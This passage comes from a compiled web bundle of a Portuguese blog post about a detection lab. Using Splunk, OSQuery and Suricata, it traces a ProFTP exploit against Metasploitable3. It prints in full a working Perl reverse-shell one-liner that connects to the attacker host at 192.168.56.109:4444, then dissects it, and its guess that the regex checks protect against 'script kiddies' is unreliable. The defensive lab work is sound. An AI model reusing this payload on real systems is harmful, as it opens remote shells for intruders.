",(0,n.kt)("strong",{parentName:"p"},"de rede")," da requisi\xe7\xe3o acima."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-sql"},'index=*  id.orig_h="192.168.56.109" id.resp_h="192.168.56.210" id.resp_p=4444 sourcetype="zeek:json"\n| stats values(id.orig_h), values(id.resp_h), values(id.resp_p), sum(orig_ip_bytes), sum(resp_ip_bytes) by _time\n')),(0,n.kt)("p",null,'{: file="Splunk Search"}'),(0,n.kt)("h3",{id:"detecting-proftp-exploit---osquery"},"Detecting ProFTP Exploit - OSQuery"),(0,n.kt)("p",null,"Agora \xe1 n\xedvel de m\xe1quina, podemos verificar no OSQuery quais os efeitos do exploit.\nBusquei primeiro pelos processos criados que possuem um command line com o IP do atacante."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM processes where cmdline LIKE '%192.168.56.109%';\n")),(0,n.kt)("p",null,'{: file="OSQuery Search"}\n',(0,n.kt)("img",{alt:"osquery-perl.png",src:t(5579).Z,width:"1887",height:"606"})),(0,n.kt)("p",null,"Como uma conex\xe3o foi estabelecida anteriormente, busquei por sockets abertos com o IP do atacante tamb\xe9m:"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM process_open_sockets where remote_address =  '192.168.56.109';\n")),(0,n.kt)("p",null,'{: file="OSQuery Search"}'),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"osquery-socketremotaddr.png",src:t(901).Z,width:"1902",height:"582"})),(0,n.kt)("p",null,"Vamos ao estudo do que aconteceu. Quebrando o payload original em partes, e entendendo cada uma delas. O payload executado foi o seguinte:"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-perl"},"perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"192.168.56.109:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' &\n")),(0,n.kt)("p",null,'{: file="Payload malicioso"}'),(0,n.kt)("ol",null,(0,n.kt)("li",{parentName:"ol"},"Esse payload cria um fork (processo filho);")),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-perl"},"$p=fork;exit\n")),(0,n.kt)("ol",{start:2},(0,n.kt)("li",{parentName:"ol"},"Manipula as vari\xe1veis de ambiente;")),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-perl"},"if($p);\n  foreach my $key(keys %ENV){\n    if($ENV{$key}=~/(.*)/){\n    $ENV{$key}=$1;\n    }\n  }\n")),(0,n.kt)("ol",{start:3},(0,n.kt)("li",{parentName:"ol"},"Cria uma vari\xe1vel ",(0,n.kt)("inlineCode",{parentName:"li"},"$c"),", que cria um socket de rede com o Kali;")),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-perl"},'$c=new IO::Socket::INET(PeerAddr,"192.168.56.109:4444");\n')),(0,n.kt)("ol",{start:4},(0,n.kt)("li",{parentName:"ol"},"O fork le a entrada(",(0,n.kt)("inlineCode",{parentName:"li"},"STDIN"),") que digitar-mos, e escreve a sa\xedda (",(0,n.kt)("inlineCode",{parentName:"li"},"$~"),") no socket ",(0,n.kt)("inlineCode",{parentName:"li"},"$c")," por meio de um redirecionamento, isso tudo em looping, fazendo parecer um shell interativo.")),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-perl"},"STDIN->fdopen($c,r);\n$~->fdopen($c,w);\nwhile(<>){\n  if($_=~ /(.*)/){\n  system $1;\n  }\n}\n")),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Pelo o que entendi, esses if's (",(0,n.kt)("inlineCode",{parentName:"p"},"if($_=~ /(.*)/)"),") s\xe3o como uma prote\xe7\xe3o contra script kiddies, ou apenas para redu\xe7\xe3o de poss\xedveis danos maiores. Eles removem a possibilidade de uso de caracteres maliciosos (caracteres de escape e controle), pois com eles, o estrago pode ser muito maior pelo jeito. Mas atacantes sofisticados podem remover essas prote\xe7\xf5es.\n{: .prompt-info}")),(0,n.kt)("p",null,"Essa parte achei bem interessante, da pra diferenciar o tipo de atacante s\xf3 pelo payload!"),(0,n.kt)("h3",{id:"detecting-kernel-exploit-download---splunk"},"Detecting Kernel Exploit Download - Splunk"),(0,n.kt)("p",null,"Agora que sabemos que o servidor foi ownado podemos ver se ele fez requisi\xe7\xf5es para outros servidores."),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM process_open_sockets where remote_address =  '192.168.56.109';\n")),(0,n.kt)("p",null,(0,n.kt)("img",{alt:"wget.png",src:t(1095).Z,width:"1170",height:"596"})),(0,n.kt)("p",null,"Pelos logs do suricata, conseguimos pegar a requisi\xe7\xe3o originada pelo servidor para o servidor malicioso, que foi usada para fazer o download do malware.  "),(0,n.kt)("p",null,"Esse foi apenas um exemplo de v\xe1rias das possibilidades com esse laborat\xf3rio."),(0,n.kt)("h1",{id:"referencias"},"Referencias"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("a",{parentName:"li",href:"https://detectionlab.network"},"https://detectionlab.network")),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("a",{parentName:"li",href:"https://docs.nxlog.co/userguide/configure/index.html"},"https://docs.nxlog.co/userguide/configure/index.html")),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("a",{parentName:"li",href:"https://osquery.readthedocs.io/en/latest/"},"https://osquery.readthedocs.io/en/latest/")),(0,n.kt)("li",{parentName:"ul"},(0,n.kt)("a",{parentName:"li",href:"https://github.com/rapid7/metasploitable3/"},"https://github.com/rapid7/metasploitable3/"))),(0,n.kt)("p",null,(0,n.kt)("em",{parentName:"p"},"[SO]",':"Sistema Operacional"\n'),"[dropo]",': "Do ingles, drop, derrubar"'))}c.isMDXComponent=!0},2596:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/DectEng-16f9cacdfa7925b95d9bf6b52bb424c9.png"},3287:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/apache_perl-f41a1c5b9d9b0161d37108ccc2c1b7f6.png"},7819:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/detectionlab_simples-logging.drawio-f649221797f0a99f1c1b1ec0c087eb43.png"},9955:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/detectionlabmeta3x-bb7bdd513167c3552d02c2090ba7f90d.png"},8061:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/nmap1-554281ff45181aac4638277739d51f51.png"},5579:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/osquery-perl-7c431467a23b4067296b942f6f3a9398.png"},901:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/osquery-socketremotaddr-6b0fba5445b9c1e729404aca42372538.png"},6124:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/overview-d53e1b77b882058fcbb23e03c0bc245c.png"},597:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/proftp-exploit-cbacd67f53a807680593449da7a03a24.png"},3687:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/salve-77fe455fd5f76f8124b30ea6063a1b17.png"},5614:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/searchsploit-446565c82ac1b2043acd838e7f2bd46b.png"},8033:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/splunk-settings-index-e7edfbb2621ef4a7b513ecbef65b41da.png"},6028:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/splunk-settings-6c5918c81f3b27aac525f5cdeb86916f.png"},3770:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/suricataXnmap-39389ce00ec333137a75d501142e00af.png"},1095:(e,a,t)=>{t.d(a,{Z:()=>o});const o=t.p+"assets/images/wget-7d28e70d48569128f63fa91006bf6134.png"}}]);